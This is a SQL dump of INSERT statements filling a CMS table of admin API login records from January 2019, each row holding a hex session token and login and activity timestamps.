INSERT INTO `jc_api_user_login` VALUES (265, '0AE84BBA3BB1635A3CFC88B90E366FB8', 'admin', '2019-01-02 11:15:30', 1, '2019-01-02 11:15:30');
INSERT INTO `jc_api_user_login` VALUES (266, 'FA619B76D7DE2FCE7FFE22D434072BED', 'admin', '2019-01-02 11:18:01', 1, '2019-01-02 11:18:01');
INSERT INTO `jc_api_user_login` VALUES (267, '1C5746B1B1A372534B10FAEDDF1BA815', 'admin', '2019-01-02 11:18:32', 1, '2019-01-02 11:18:32');
INSERT INTO `jc_api_user_login` VALUES (268, '586A06999DB9962A4B6CA9894DA1473B', 'admin', '2019-01-02 11:19:16', 1, '2019-01-02 11:19:16');
INSERT INTO `jc_api_user_login` VALUES (269, 'B15F4127FC8053D94A41CE3F35FE8B94', 'admin', '2019-01-02 11:20:03', 1, '2019-01-02 11:21:22');
INSERT INTO `jc_api_user_login` VALUES (270, 'AFB553302A4D41C589D7C174F270A6D9', 'admin', '2019-01-02 11:21:45', 1, '2019-01-02 11:21:45');
INSERT INTO `jc_api_user_login` VALUES (271, 'C5EA6CF5A5FB912B3AA5894C5B0FE36A', 'admin', '2019-01-02 13:51:28', 1, '2019-01-02 13:54:49');
INSERT INTO `jc_api_user_login` VALUES (272, 'CAF8B0E7721F1E0E48C6672F394F2BCA', 'admin', '2019-01-02 13:57:33', 1, '2019-01-02 13:58:00');
INSERT INTO `jc_api_user_login` VALUES (273, '17F2255EF5DA0789463E772E2D29958E', 'admin', '2019-01-02 16:24:41', 1, '2019-01-02 16:24:42');
INSERT INTO `jc_api_user_login` VALUES (274, 'AB541FF378C9F3564161BA181CE20877', 'admin', '2019-01-02 17:12:30', 1, '2019-01-02 17:12:30');
INSERT INTO `jc_api_user_login` VALUES (275, 'F837DE5520440D7F01A00C996DAD5DD8', 'admin', '2019-01-03 10:12:30', 1, '2019-01-03 10:12:31');
INSERT INTO `jc_api_user_login` VALUES (276, '0AFF1A43F9450FC299E228D9D4C57908', 'admin', '2019-01-03 10:12:39', 1, '2019-01-03 10:12:39');
INSERT INTO `jc_api_user_login` VALUES (277, '85CC00394352475EDFAB7975E7C954C5', 'admin', '2019-01-03 10:18:08', 1, '2019-01-03 10:18:17');
INSERT INTO `jc_api_user_login` VALUES (279, 'BAB77F84B8A991BF285FDBF119270919', 'admin', '2019-01-03 11:42:36', 1, '2019-01-03 11:43:30');
INSERT INTO `jc_api_user_login` VALUES (280, '4FC93E203E30662320F76855E3D6A63B', 'admin', '2019-01-03 14:00:50', 1, '2019-01-03 14:00:50');
INSERT INTO `jc_api_user_login` VALUES (281, '124CED4B7593B15BA9AAEFB5D384CC87', 'admin', '2019-01-03 14:00:58', 1, '2019-01-03 14:00:58');
INSERT INTO `jc_api_user_login` VALUES (282, '362B667FF26C11628D8B2B9C040CB3D3', 'admin', '2019-01-03 14:03:48', 1, '2019-01-03 14:03:48');
INSERT INTO `jc_api_user_login` VALUES (283, '1D0653BEB2BF32F30F86731C9FAB8AAD', 'admin', '2019-01-03 14:05:49', 1, '2019-01-03 14:05:49');
INSERT INTO `jc_api_user_login` VALUES (284, '8C7089C0849810FCCD324D2D11E430D4', 'admin', '2019-01-03 14:06:20', 1, '2019-01-03 14:06:20');
INSERT INTO `jc_api_user_login` VALUES (285, 'BAC04D069EFDE9F54FB38B819BD6D6A4', 'admin', '2019-01-03 14:06:51', 1, '2019-01-03 14:06:51');
INSERT INTO `jc_api_user_login` VALUES (286, '9F7B90EB0FE809C58C14A0FBF4D43D3D', 'admin', '2019-01-03 14:08:54', 1, '2019-01-03 14:08:54');
INSERT INTO `jc_api_user_login` VALUES (287, '026464DC4E334A8AF32E82879AAF134B', 'admin', '2019-01-03 14:12:48', 1, '2019-01-03 14:18:20');
INSERT INTO `jc_api_user_login` VALUES (288, '8FC3436C7460EF5083FCF808912E9A47', 'admin', '2019-01-03 14:19:53', 1, '2019-01-03 14:19:54');
INSERT INTO `jc_api_user_login` VALUES (289, '439450F61204C6E1BE1D4BB89C1E4D76', 'admin', '2019-01-03 14:29:15', 1, '2019-01-03 14:30:23');
INSERT INTO `jc_api_user_login` VALUES (290, '1627B49BB5EE2B29A58FA32A5480750E', 'admin', '2019-01-03 14:30:29', 1, '2019-01-03 14:31:09');
INSERT INTO `jc_api_user_login` VALUES (291, 'C546C5C7C97A093848FFE437399C1B37', 'admin', '2019-01-03 14:31:14', 1, '2019-01-03 14:33:47');
INSERT INTO `jc_api_user_login` VALUES (292, 'A598389727C066DC8D0CA0BC23F177B3', 'admin', '2019-01-03 14:37:54', 1, '2019-01-03 15:16:48');
INSERT INTO `jc_api_user_login` VALUES (293, '9BBB05DF93DB3B7B8A315AABEA4F1A99', 'admin', '2019-01-03 15:19:31', 1, '2019-01-03 15:19:31');
INSERT INTO `jc_api_user_login` VALUES (294, '05704314577B5DD4AF07EA06CFAF12C9', 'admin', '2019-01-03 15:23:38', 1, '2019-01-03 15:23:38');
INSERT INTO `jc_api_user_login` VALUES (295, 'F3AACF818FEAC5C67C7DFDC34BF7D6B1', 'admin', '2019-01-03 15:29:02', 1, '2019-01-03 15:36:26');
INSERT INTO `jc_api_user_login` VALUES (296, '1FED325703C01784BDBD289715014AFB', 'admin', '2019-01-03 15:50:20', 1, '2019-01-03 16:08:02');
INSERT INTO `jc_api_user_login` VALUES (297, '833DCFE5EB54F0EC89625CA15DA2EA58', 'admin', '2019-01-03 16:33:01', 1, '2019-01-03 16:33:01');
INSERT INTO `jc_api_user_login` VALUES (298, '0165199D963FCEEF9B19DCD7EB453BBF', 'admin', '2019-01-03 16:37:20', 1, '2019-01-03 16:37:20');
INSERT INTO `jc_api_user_login` VALUES (299, '89D1560AD885C02D8656A041087257E8', 'admin', '2019-01-03 16:51:24', 1, '2019-01-03 16:51:24');
INSERT INTO `jc_api_user_login` VALUES (300, 'EEA575C599B9E8EC79986E961A061C04', 'admin', '2019-01-03 16:52:27', 1, '2019-01-03 16:52:27');
INSERT INTO `jc_api_user_login` VALUES (301, '85009C3097405B765BAF40A280D4FC38', 'admin', '2019-01-03 16:55:03', 1, '2019-01-03 16:55:03');
INSERT INTO `jc_api_user_login` VALUES (302, '9C6DBADF87693AEC0DCC526A0B018033', 'admin', '2019-01-03 16:58:32', 1, '2019-01-03 16:58:52');
INSERT INTO `jc_api_user_login` VALUES (303, 'F4249CF8B0F3D5CC7F7980199E8F4D47', 'admin', '2019-01-03 17:02:28', 1, '2019-01-03 17:02:28');
INSERT INTO `jc_api_user_login` VALUES (304, '6DBFCC84C74851AF0707823CF8B6F121', 'admin', '2019-01-03 17:09:47', 1, '2019-01-03 17:09:48');
INSERT INTO `jc_api_user_login` VALUES (305, '84AE2B0CD9FA0A08855BF0FA7DE7A96C', 'admin', '2019-01-04 09:53:23', 1, '2019-01-04 09:53:43');
INSERT INTO `jc_api_user_login` VALUES (307, '529D52703D7362A50CD444004DA349FC', 'admin', '2019-01-04 11:31:57', 1, '2019-01-04 11:37:35');
INSERT INTO `jc_api_user_login` VALUES (308, 'C77D81967B458B459CDAA264B20E5489', 'admin', '2019-01-04 13:42:34', 1, '2019-01-04 14:19:44');
INSERT INTO `jc_api_user_login` VALUES (309, 'B556218900A9AC3B1E512328EEB1DB59', 'admin', '2019-01-04 14:21:44', 1, '2019-01-04 14:21:44');
INSERT INTO `jc_api_user_login` VALUES (310, '1DF766131AE35789E24F283776191EA2', 'admin', '2019-01-04 14:33:08', 1, '2019-01-04 14:33:08');
INSERT INTO `jc_api_user_login` VALUES (311, '233362F85115349DA6137CF6AEC7428B', 'admin', '2019-01-04 14:34:32', 1, '2019-01-04 14:34:32');
INSERT INTO `jc_api_user_login` VALUES (312, '54737E2D58EA5E13B47B51A345137E0F', 'admin', '2019-01-04 15:29:48', 1, '2019-01-04 15:35:01');
INSERT INTO `jc_api_user_login` VALUES (313, '8AA3F388CA68D278EF112598A5A6EEEA', 'admin', '2019-01-04 15:35:20', 1, '2019-01-04 15:35:37');
INSERT INTO `jc_api_user_login` VALUES (314, '534A19AF097E6D43BB859E4495030FDF', 'admin', '2019-01-04 15:36:30', 1, '2019-01-04 15:37:01');
INSERT INTO `jc_api_user_login` VALUES (315, '701AFD4D450BF0E193E55C80A3D711CC', 'admin', '2019-01-04 15:38:02', 1, '2019-01-04 15:38:03');
INSERT INTO `jc_api_user_login` VALUES (316, '824EC344C14B8C270166E1546EA325DD', 'admin', '2019-01-04 15:38:21', 1, '2019-01-04 15:38:22');
INSERT INTO `jc_api_user_login` VALUES (317, '2E1FB6432DA97A9A3BD4C27A01C92AB2', 'admin', '2019-01-04 15:39:51', 1, '2019-01-04 15:40:23');
INSERT INTO `jc_api_user_login` VALUES (318, '6F6A07EC758D17948BB9900FC96D6802', 'admin', '2019-01-04 15:40:35', 1, '2019-01-04 15:45:37');
INSERT INTO `jc_api_user_login` VALUES (319, '90A35F4E984EDF2F840E84848BDFD2C0', 'admin', '2019-01-04 15:49:36', 1, '2019-01-04 15:50:22');
INSERT INTO `jc_api_user_login` VALUES (320, '6D5F63DE8235FF589ED8C08850640E22', 'admin', '2019-01-04 15:53:10', 1, '2019-01-04 15:53:13');
INSERT INTO `jc_api_user_login` VALUES (321, '79FAC67C8E6867C369CC8C2124018751', 'admin', '2019-01-04 16:00:24', 1, '2019-01-04 16:00:35');
INSERT INTO `jc_api_user_login` VALUES (322, '557A9A509538F799AA89294B94499ABC', 'admin', '2019-01-04 16:01:46', 1, '2019-01-04 16:01:46');
INSERT INTO `jc_api_user_login` VALUES (323, 'E32FE760477FFB71D112AFC712CDC6DF', 'admin', '2019-01-04 16:02:52', 1, '2019-01-04 16:02:56');
INSERT INTO `jc_api_user_login` VALUES (324, '466205C6E9D4EF02859CEFAA45D80C94', 'admin', '2019-01-04 16:10:24', 1, '2019-01-04 16:10:25');
INSERT INTO `jc_api_user_login` VALUES (325, '52DE6E721810CA7EDE049674BAFC43C9', 'admin', '2019-01-04 16:18:59', 1, '2019-01-04 16:19:00');
INSERT INTO `jc_api_user_login` VALUES (326, '715BF4654BD44D21E63277E204BD020A', 'admin', '2019-01-04 16:20:38', 1, '2019-01-04 16:20:39');
INSERT INTO `jc_api_user_login` VALUES (327, 'E135070E44D2338C2AA463D7F6863AE9', 'admin', '2019-01-04 16:25:05', 1, '2019-01-04 16:25:06');
INSERT INTO `jc_api_user_login` VALUES (328, '19A2583E1923F8A0FC99EA1AD010CC91', 'admin', '2019-01-04 16:26:31', 1, '2019-01-04 16:26:47');
INSERT INTO `jc_api_user_login` VALUES (329, 'D01983FD1EC6BF6B6535BE6FBD510013', 'admin', '2019-01-04 16:28:37', 1, '2019-01-04 16:28:43');
INSERT INTO `jc_api_user_login` VALUES (330, '5C297B927C033A0C8DCEEC450DE3EC34', 'admin', '2019-01-04 16:31:28', 1, '2019-01-04 16:33:22');
INSERT INTO `jc_api_user_login` VALUES (332, 'D0CFA7B9EFFA5E73324C4230CF624761', 'admin', '2019-01-04 16:42:21', 1, '2019-01-04 16:42:22');
INSERT INTO `jc_api_user_login` VALUES (333, '02D67D887AC95FFDFB94FE19C47C7B58', 'admin', '2019-01-04 16:53:05', 1, '2019-01-04 16:53:05');
INSERT INTO `jc_api_user_login` VALUES (336, '118D039AB5E475BD0D15AF42C040E6E3', 'admin', '2019-01-04 17:06:14', 1, '2019-01-04 17:06:15');
INSERT INTO `jc_api_user_login` VALUES (338, 'F92DA2DB9C5021AC076645E4130F5260', 'admin', '2019-01-04 17:06:41', 1, '2019-01-04 17:06:41');
INSERT INTO `jc_api_user_login` VALUES (339, 'A0E84F337A53D8446A98C830835EE4B3', 'admin', '2019-01-04 17:07:18', 1, '2019-01-04 17:07:18');
INSERT INTO `jc_api_user_login` VALUES (340, '4A5ADEFB4052FF58F39C3A88D4615695', 'admin', '2019-01-04 17:36:44', 1, '2019-01-04 17:36:47');
INSERT INTO `jc_api_user_login` VALUES (341, 'D305F6FA68C6BA329545694981547B21', 'admin', '2019-01-07 09:22:37', 1, '2019-01-07 10:02:11');
INSERT INTO `jc_api_user_login` VALUES (342, 'C2AC537D579C389EFC32F7F43DF086AA', 'admin', '2019-01-07 10:30:59', 1, '2019-01-07 11:00:32');
INSERT INTO `jc_api_user_login` VALUES (343, 'B145AD91E80E2B0754B753AF4A6D1731', 'admin', '2019-01-07 11:08:53', 1, '2019-01-07 11:08:53');
INSERT INTO `jc_api_user_login` VALUES (344, '35DC12C2DFA53897918316325F2CB494', 'admin', '2019-01-07 11:15:16', 1, '2019-01-07 11:15:16');
INSERT INTO `jc_api_user_login` VALUES (345, 'F66E6DEB0C2CD55FF8248DC61B6CA011', 'admin', '2019-01-07 11:17:05', 1, '2019-01-07 11:31:14');
INSERT INTO `jc_api_user_login` VALUES (346, '35CB58290C6E56E91DE1CBF813647731', 'admin', '2019-01-07 13:30:51', 1, '2019-01-07 13:30:52');
INSERT INTO `jc_api_user_login` VALUES (347, '16ABDC675EBDD242CB14AD7FB8656069', 'admin', '2019-01-07 13:40:17', 1, '2019-01-07 13:40:18');
INSERT INTO `jc_api_user_login` VALUES (348, 'D4917C5201F5CEE3E23C5BB91C936965', 'admin', '2019-01-07 13:52:29', 1, '2019-01-07 13:58:58');
INSERT INTO `jc_api_user_login` VALUES (349, '4393FA746242AA2B924CBB765DFC5F2E', 'admin', '2019-01-07 14:04:00', 1, '2019-01-07 14:04:00');
INSERT INTO `jc_api_user_login` VALUES (350, '71F479E059E15607B14B48381B3D69E9', 'admin', '2019-01-07 14:04:49', 1, '2019-01-07 14:05:07');
INSERT INTO `jc_api_user_login` VALUES (351, '71AF398C514F3FB8A5CFCCEEF1299927', 'admin', '2019-01-07 14:11:49', 1, '2019-01-07 14:11:50');
INSERT INTO `jc_api_user_login` VALUES (352, 'E510C826615FD6B544EC123308D480F3', 'admin', '2019-01-07 14:15:23', 1, '2019-01-07 14:20:56');
INSERT INTO `jc_api_user_login` VALUES (353, 'A5200D0307C99E7EC1C9E2EECC196182', 'admin', '2019-01-07 14:56:54', 1, '2019-01-07 15:09:17');
INSERT INTO `jc_api_user_login` VALUES (354, '080F234C9D3D13029091A3205ECA9481', 'admin', '2019-01-07 15:11:44', 1, '2019-01-07 15:17:16');
INSERT INTO `jc_api_user_login` VALUES (355, '50D713F97562476FA9D8163E8AB3441D', 'admin', '2019-01-07 16:25:57', 1, '2019-01-07 16:25:58');
INSERT INTO `jc_api_user_login` VALUES (356, '7C7D29E7A1054112460CB5CE96A630CA', 'admin', '2019-01-08 10:36:46', 1, '2019-01-08 10:36:46');
INSERT INTO `jc_api_user_login` VALUES (357, '971DE3C185C2A69142E2DEBA2BB281C6', 'admin', '2019-01-08 11:30:30', 1, '2019-01-08 11:30:31');
INSERT INTO `jc_api_user_login` VALUES (358, 'C0148D42E683C21D19316BC0972FD16F', 'admin', '2019-01-08 11:31:12', 1, '2019-01-08 11:31:12');
INSERT INTO `jc_api_user_login` VALUES (359, '6A4314C67278F69010CE043603BA2CBC', 'admin', '2019-01-08 13:46:12', 1, '2019-01-08 14:00:57');
INSERT INTO `jc_api_user_login` VALUES (360, 'F6E0319E0201D6788DCB8EFFB6BC5B6F', 'admin', '2019-01-08 14:03:31', 1, '2019-01-08 14:35:54');
INSERT INTO `jc_api_user_login` VALUES (361, '873D3499EE719D451FD3C0A16C1BDA1B', 'admin', '2019-01-08 15:08:24', 1, '2019-01-08 17:33:09');
INSERT INTO `jc_api_user_login` VALUES (362, 'B24454868F5EC200DCF56373B395A756', 'admin', '2019-01-09 09:08:30', 1, '2019-01-09 09:10:26');
INSERT INTO `jc_api_user_login` VALUES (363, '028D309A10FBED7C058FDBD31B8F04D6', 'admin', '2019-01-09 09:33:36', 1, '2019-01-09 09:33:36');
INSERT INTO `jc_api_user_login` VALUES (364, '926A5D3CDFF0C70D3E5FCA8401F0C5EF', 'admin', '2019-01-09 09:35:34', 1, '2019-01-09 10:14:31');
INSERT INTO `jc_api_user_login` VALUES (365, 'ED06C197991AA76581DC5BC46A3AC8EB', 'admin', '2019-01-09 10:35:06', 1, '2019-01-09 10:35:06');
INSERT INTO `jc_api_user_login` VALUES (366, '08B2695F66274E3288788974FFCEC2CE', 'admin', '2019-01-09 10:35:57', 1, '2019-01-09 10:54:31');
INSERT INTO `jc_api_user_login` VALUES (367, 'CE00904451CFB1C248EEB1A09427DF06', 'admin', '2019-01-09 13:25:56', 1, '2019-01-09 13:32:21');
INSERT INTO `jc_api_user_login` VALUES (368, '162821572AD27E6C6756CFB41417320C', 'admin', '2019-01-09 13:34:30', 1, '2019-01-09 13:37:16');
INSERT INTO `jc_api_user_login` VALUES (369, 'C553E7F7C1BEA8E311264007F68C359C', 'admin', '2019-01-09 13:44:41', 1, '2019-01-09 13:45:02');
INSERT INTO `jc_api_user_login` VALUES (370, 'E0CE329EE0380CD9271B16F3533254AA', 'admin', '2019-01-09 13:47:52', 1, '2019-01-09 13:47:53');
INSERT INTO `jc_api_user_login` VALUES (371, '7015FCAC3AA3C6041551265727E87FAD', 'admin', '2019-01-09 13:48:55', 1, '2019-01-09 13:48:55');
INSERT INTO `jc_api_user_login` VALUES (372, 'D51CE25F8EF5E2D0616D9150E2770132', 'admin', '2019-01-09 13:50:45', 1, '2019-01-09 13:50:45');
INSERT INTO `jc_api_user_login` VALUES (373, '7672D7370171E6D2E56892EACA0E8B24', 'admin', '2019-01-09 13:55:40', 1, '2019-01-09 14:01:31');
INSERT INTO `jc_api_user_login` VALUES (374, '2EF1A2656251859DF2E7268ADCB8551E', 'admin', '2019-01-09 14:04:26', 1, '2019-01-09 14:04:26');
INSERT INTO `jc_api_user_login` VALUES (375, '5A5A92946FFBD83F56BBB5C6B1F489F3', 'admin', '2019-01-09 14:06:55', 1, '2019-01-09 14:11:42');
INSERT INTO `jc_api_user_login` VALUES (376, '8DE0C829EBCB5E3B807BF66AAC343CE1', 'admin', '2019-01-09 14:39:22', 1, '2019-01-09 15:02:18');
INSERT INTO `jc_api_user_login` VALUES (377, '3D1010C2C716C22A072410DFAAF148DE', 'admin', '2019-01-09 15:05:10', 1, '2019-01-09 15:42:21');
INSERT INTO `jc_api_user_login` VALUES (378, 'C0B55A0231EA8B5ECACA13BC38F8F733', 'admin', '2019-01-09 15:43:00', 1, '2019-01-09 16:11:33');
INSERT INTO `jc_api_user_login` VALUES (379, 'F001F789E7D5E6CCAC3CF5AE5CCB6BA1', 'admin', '2019-01-09 16:11:42', 1, '2019-01-09 16:22:44');
INSERT INTO `jc_api_user_login` VALUES (380, '0DBA7875CEF510A2A8274CAF57C264D4', 'admin', '2019-01-09 16:23:38', 1, '2019-01-09 16:34:13');
INSERT INTO `jc_api_user_login` VALUES (381, '7D239846A0A7B3AA7C389574E8B4CFD5', 'admin', '2019-01-09 16:35:50', 1, '2019-01-09 16:35:51');
INSERT INTO `jc_api_user_login` VALUES (382, 'DFD9D5BBF63B631185560574F8435AC1', 'admin', '2019-01-09 16:36:27', 1, '2019-01-09 16:36:27');
INSERT INTO `jc_api_user_login` VALUES (383, '23BDA480AFC98AC6CCC0C085777BD06A', 'admin', '2019-01-09 16:36:55', 1, '2019-01-09 16:36:56');
INSERT INTO `jc_api_user_login` VALUES (384, '425C82C423DE141DD8CFBE92E0C00622', 'admin', '2019-01-10 09:29:03', 1, '2019-01-10 09:29:04');
INSERT INTO `jc_api_user_login` VALUES (385, '01C0F7140EAA2B2B78A456C07102C97C', 'admin', '2019-01-10 09:31:50', 1, '2019-01-10 09:31:51');
INSERT INTO `jc_api_user_login` VALUES (386, 'B9AB6A9AC26B94672210862D74D7C543', 'admin', '2019-01-10 09:34:53', 1, '2019-01-10 09:36:30');
INSERT INTO `jc_api_user_login` VALUES (387, 'ED23AF1A3AC7AD0D72EADB175A5A48EB', 'admin', '2019-01-10 09:36:55', 1, '2019-01-10 09:37:00');
INSERT INTO `jc_api_user_login` VALUES (388, 'CBEF4C7B7D30CA9B44C71B11B79E3DC8', 'admin', '2019-01-10 09:37:26', 1, '2019-01-10 09:37:27');
INSERT INTO `jc_api_user_login` VALUES (389, '76D188ECB95E906677D2441995782429', 'admin', '2019-01-10 09:40:09', 1, '2019-01-10 09:40:09');
INSERT INTO `jc_api_user_login` VALUES (390, 'AE29292FF4BDCE743887428515D1F565', 'admin', '2019-01-10 09:45:25', 1, '2019-01-10 09:45:37');
INSERT INTO `jc_api_user_login` VALUES (391, '52AD97C2EEB06075F38DB9F36FB937A1', 'admin', '2019-01-10 09:45:50', 1, '2019-01-10 09:45:51');
INSERT INTO `jc_api_user_login` VALUES (392, '2E1058FD3AF1F9C9C12CDFF9B84A0DC8', 'admin', '2019-01-10 09:55:08', 1, '2019-01-10 09:55:25');
INSERT INTO `jc_api_user_login` VALUES (393, '36068BFFA2A9BD40A3AD7A4522E72114', 'admin', '2019-01-10 09:59:46', 1, '2019-01-10 09:59:46');
INSERT INTO `jc_api_user_login` VALUES (394, 'D359D6F31378BA517061A675938FF82E', 'admin', '2019-01-10 10:28:32', 1, '2019-01-10 10:28:37');
INSERT INTO `jc_api_user_login` VALUES (395, 'E8F3BE0958919A17973D3984B6B340D9', 'admin', '2019-01-10 10:33:50', 1, '2019-01-10 10:33:50');
INSERT INTO `jc_api_user_login` VALUES (396, 'E6220B37F4A4D456C3D645F80F524385', 'admin', '2019-01-10 10:34:26', 1, '2019-01-10 10:34:26');
INSERT INTO `jc_api_user_login` VALUES (397, '2121ED8390B8706964D50569510C1504', 'admin', '2019-01-10 10:35:07', 1, '2019-01-10 10:35:07');
INSERT INTO `jc_api_user_login` VALUES (398, '54BC1673F6A3D8FF26CC9E72F43F3AC2', 'admin', '2019-01-10 10:36:31', 1, '2019-01-10 10:37:46');
INSERT INTO `jc_api_user_login` VALUES (399, 'AC4C71A5596B7080754EEC6CEEAFA257', 'admin', '2019-01-10 10:48:11', 1, '2019-01-10 10:48:12');
INSERT INTO `jc_api_user_login` VALUES (400, 'AB1D20548F291DB747FBF44A5131FB1A', 'admin', '2019-01-10 11:10:01', 1, '2019-01-10 11:12:24');
INSERT INTO `jc_api_user_login` VALUES (401, 'C5D6206D41DA098F46E116D176B61890', 'admin', '2019-01-10 14:13:45', 1, '2019-01-10 14:59:24');
INSERT INTO `jc_api_user_login` VALUES (402, '2FA294CB64944870787CC921BEBE3866', 'admin', '2019-01-10 15:47:45', 1, '2019-01-10 16:02:38');
INSERT INTO `jc_api_user_login` VALUES (403, 'A1E5B44180F4D1F9BBED4E1C1DCF9679', 'admin', '2019-01-10 16:03:11', 1, '2019-01-10 16:03:11');
INSERT INTO `jc_api_user_login` VALUES (404, '0E7BD29CC7D36438096305A437A71DF4', 'admin', '2019-01-10 16:07:38', 1, '2019-01-10 16:29:48');
INSERT INTO `jc_api_user_login` VALUES (405, '5D586E4407441DCF19BE76814B9F172E', 'admin', '2019-01-10 16:30:15', 1, '2019-01-10 16:36:56');
INSERT INTO `jc_api_user_login` VALUES (406, '64E49B938F7E6E3D2054DAAE92D12EF1', 'admin', '2019-01-10 16:37:07', 1, '2019-01-10 16:45:31');
INSERT INTO `jc_api_user_login` VALUES (407, '03CB8F8AD5368E39E352AA494B6D816C', 'admin', '2019-01-10 16:45:49', 1, '2019-01-10 16:50:50');
INSERT INTO `jc_api_user_login` VALUES (408, '3AA0CF4C902CA2F9B58759BF4B7CC7C1', 'admin', '2019-01-10 16:50:56', 1, '2019-01-10 16:53:42');
INSERT INTO `jc_api_user_login` VALUES (409, '93785DB25625667631C0AD5809BE40E9', 'admin', '2019-01-10 16:54:02', 1, '2019-01-10 16:58:58');
INSERT INTO `jc_api_user_login` VALUES (410, '4912107C453F690A747CFF7E119CCF4C', 'admin', '2019-01-10 17:02:35', 1, '2019-01-10 17:02:36');
INSERT INTO `jc_api_user_login` VALUES (411, '7C8F6434EAF36D4E377B3C2FCBB4F21D', 'admin', '2019-01-10 17:04:22', 1, '2019-01-10 17:04:57');
INSERT INTO `jc_api_user_login` VALUES (412, '505ECC47A2B17FF3C70F96446605F022', 'admin', '2019-01-10 17:06:02', 1, '2019-01-10 17:08:22');
INSERT INTO `jc_api_user_login` VALUES (413, '3C91036043BAB312E61F4A187953426F', 'admin', '2019-01-10 17:11:22', 1, '2019-01-10 17:11:23');
INSERT INTO `jc_api_user_login` VALUES (414, '6EA5723C8F5048B07FCC53720EDF0F58', 'admin', '2019-01-10 17:12:32', 1, '2019-01-10 17:36:32');
INSERT INTO `jc_api_user_login` VALUES (415, 'BAF92EC51F18DE723A8D27AD49C77CC5', 'admin', '2019-01-10 17:36:36', 1, '2019-01-10 17:39:32');
INSERT INTO `jc_api_user_login` VALUES (416, '9BD75DD0EC1F9BB256914BF64CB2261F', 'admin', '2019-01-11 09:19:57', 1, '2019-01-11 09:27:06');
INSERT INTO `jc_api_user_login` VALUES (417, '8D50E70949FE13BEDBF4B394C4642F33', 'admin', '2019-01-11 09:27:11', 1, '2019-01-11 09:28:50');
INSERT INTO `jc_api_user_login` VALUES (418, 'B3A8DA1A12B38C8466C15D0EFDD786CF', 'admin', '2019-01-11 09:28:58', 1, '2019-01-11 09:44:11');
INSERT INTO `jc_api_user_login` VALUES (419, '269384A5CE53562D72948C8E35EAE668', 'admin', '2019-01-11 09:44:25', 1, '2019-01-11 10:00:53');
INSERT INTO `jc_api_user_login` VALUES (420, 'A92AF7CD153C7BDBF7A018C58DF6EECD', 'admin', '2019-01-11 10:01:15', 1, '2019-01-11 10:02:14');
INSERT INTO `jc_api_user_login` VALUES (421, 'BA9E0C51AE7B4080748827299D1DF859', 'admin', '2019-01-11 10:02:23', 1, '2019-01-11 10:35:56');
INSERT INTO `jc_api_user_login` VALUES (422, 'EB9E2BAFF42BAAEC29171200C49B3612', 'admin', '2019-01-11 10:40:20', 1, '2019-01-11 11:03:24');
INSERT INTO `jc_api_user_login` VALUES (423, '9B894C3AB4F69638DEE0DDFC3F90BDEC', 'admin', '2019-01-11 11:03:29', 1, '2019-01-11 11:38:18');
INSERT INTO `jc_api_user_login` VALUES (424, '6B0F648C3403FCCA8E37B0AA3FE5CC89', 'admin', '2019-01-11 11:38:46', 1, '2019-01-11 11:46:29');
INSERT INTO `jc_api_user_login` VALUES (425, 'AA8FAF0E5FFF38070CC0ED7ED8995D47', 'admin', '2019-01-11 13:37:59', 1, '2019-01-11 13:54:52');
INSERT INTO `jc_api_user_login` VALUES (426, '46C7018642D44EC561D7298A21960CDC', 'admin', '2019-01-11 13:57:37', 1, '2019-01-11 14:20:16');
INSERT INTO `jc_api_user_login` VALUES (427, '50531FE16F2F7AA2B8BDBF50CBCBEDBF', 'admin', '2019-01-11 14:37:16', 1, '2019-01-11 17:15:20');
INSERT INTO `jc_api_user_login` VALUES (428, '7FBA0EB1C167A3E41B713AC1A452803B', 'admin', '2019-01-11 17:17:34', 1, '2019-01-11 17:18:13');
INSERT INTO `jc_api_user_login` VALUES (429, '4A2408BFE27327663FD540DE63511DE1', 'admin', '2019-01-11 17:27:12', 1, '2019-01-11 17:27:29');
INSERT INTO `jc_api_user_login` VALUES (430, 'D1CA6C207234C79EB6B341B9A266CC5A', 'admin', '2019-01-13 18:46:06', 1, '2019-01-13 18:56:22');
INSERT INTO `jc_api_user_login` VALUES (431, 'C89DAAD09771E545FFB4861CCA1F67AC', 'admin', '2019-01-14 09:27:55', 1, '2019-01-14 09:35:11');
INSERT INTO `jc_api_user_login` VALUES (432, 'A12C228693310F57FF6DC1B6D85AD2AA', 'admin', '2019-01-14 09:35:28', 1, '2019-01-14 09:38:14');
INSERT INTO `jc_api_user_login` VALUES (433, '11424A7A6EE5A64A31BE29A94770C67E', 'admin', '2019-01-14 09:38:24', 1, '2019-01-14 11:34:44');
INSERT INTO `jc_api_user_login` VALUES (434, '1A8442ACD0EC39009BFE4F2ED63D411E', 'admin', '2019-01-14 13:33:56', 1, '2019-01-14 15:07:26');
INSERT INTO `jc_api_user_login` VALUES (435, '778838B9BDF3C79DF2B5FE49E374491A', 'admin', '2019-01-14 16:07:01', 1, '2019-01-14 16:13:40');
INSERT INTO `jc_api_user_login` VALUES (436, '8910AB2A4F878FA8DB5AE012FBF4D35E', 'admin', '2019-01-14 16:38:55', 1, '2019-01-14 17:34:25');
INSERT INTO `jc_api_user_login` VALUES (437, 'D55FF48066500E3C7B541A9B758671B8', 'admin', '2019-01-15 09:35:56', 1, '2019-01-15 09:52:00');
INSERT INTO `jc_api_user_login` VALUES (438, 'BADA0D16D5F766D7ED7B5C05C495E1BC', 'admin', '2019-01-15 09:52:12', 1, '2019-01-15 10:14:03');
INSERT INTO `jc_api_user_login` VALUES (439, '03749BC34393D484CBB6F5FB3015A5B7', 'admin', '2019-01-15 10:14:36', 1, '2019-01-15 10:16:08');
INSERT INTO `jc_api_user_login` VALUES (440, 'AA48F1F8ABD133256F5F590689142307', 'admin', '2019-01-15 10:16:24', 1, '2019-01-15 10:16:25');
INSERT INTO `jc_api_user_login` VALUES (441, 'E54DB75048F7C9A90EC67C919ED6922C', 'admin', '2019-01-15 10:16:59', 1, '2019-01-15 10:16:59');
INSERT INTO `jc_api_user_login` VALUES (442, 'C9E8D94DBCF343170275385616A481CD', 'admin', '2019-01-15 10:17:13', 1, '2019-01-15 10:18:18');
INSERT INTO `jc_api_user_login` VALUES (443, '90DA8F0BAF13A42783B9DBA0EB0DF693', 'admin', '2019-01-15 10:21:14', 1, '2019-01-15 10:21:14');
INSERT INTO `jc_api_user_login` VALUES (444, '5ECE85B66B242CC48D2129B391EB4CCC', 'admin', '2019-01-15 10:21:49', 1, '2019-01-15 10:21:50');
INSERT INTO `jc_api_user_login` VALUES (445, 'AA49B0D4E01F977DB67FBA560775D78B', 'admin', '2019-01-15 10:22:24', 1, '2019-01-15 10:22:24');
